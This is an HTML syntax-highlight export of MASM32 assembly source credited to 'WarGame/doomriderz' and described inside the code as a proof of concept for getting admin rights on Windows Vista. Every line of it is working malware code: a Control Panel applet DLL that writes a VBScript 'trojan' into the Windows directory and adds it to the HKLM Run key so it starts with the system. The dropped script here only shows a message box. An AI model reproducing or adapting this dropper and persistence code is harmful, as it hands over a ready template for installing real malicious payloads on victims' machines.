<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc9">option</span><span class="sc0"> </span><span class="sc10">casemap</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">none</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">windows.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">kernel32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">  \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">advapi32.inc</span><span class="sc0">

</span><span class="sc9">includelib</span><span class="sc0"> \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc5">lib</span><span class="sc0">\</span><span class="sc5">kernel32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0">  \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc5">lib</span><span class="sc0">\</span><span class="sc5">advapi32.lib</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">InternalMsG</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Coded by [WarGame/doomriderz]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; never displayed </span><span class="sc0">
</span><span class="sc5">Nm</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\VistaTrojan.vbs"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Trojan</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">exkey</span><span class="sc0"> </span><span class="sc5">HKEY</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AutoPath</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AutoKey</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VistaTrojan"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TrojanCode</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"msgbox "</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc3">"This is a simple PoC showing you how to get admin rights!"</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc3">",,"</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc3">"Coded by [WarGame/doomriderz]"</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WrittenBytes</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">; this should be the default dll entry point ... but it is useless for us</span><span class="sc0">
</span><span class="sc5">LibMain</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hInstDLL</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reason</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">unused</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">LibMain</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; the following code will have admin rights</span><span class="sc0">
</span><span class="sc5">CPIApplet</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwndCPl</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">uMsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">lParam1</span><span class="sc4">:</span><span class="sc10">DWORd</span><span class="sc4">,</span><span class="sc5">lParam2</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

          </span><span class="sc1">; drop the trojan in the windows directory</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectory</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">Trojan</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">Trojan</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">Nm</span><span class="sc0">

          </span><span class="sc1">; write it</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">Trojan</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
              </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">.endif</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">TrojanCode</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">TrojanCode</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">WrittenBytes</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

          </span><span class="sc1">; add it to autostart</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">,</span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">AutoPath</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">KEY_WRITE</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">exkey</span><span class="sc0">
          </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> !</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
              </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">.endif</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">Trojan</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">RegSetValueEx</span><span class="sc4">,</span><span class="sc5">exkey</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">AutoKey</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc10">addr</span><span class="sc0"> </span><span class="sc5">Trojan</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">,</span><span class="sc5">exkey</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CPIApplet</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">LibMain</span></div></body>
</html>
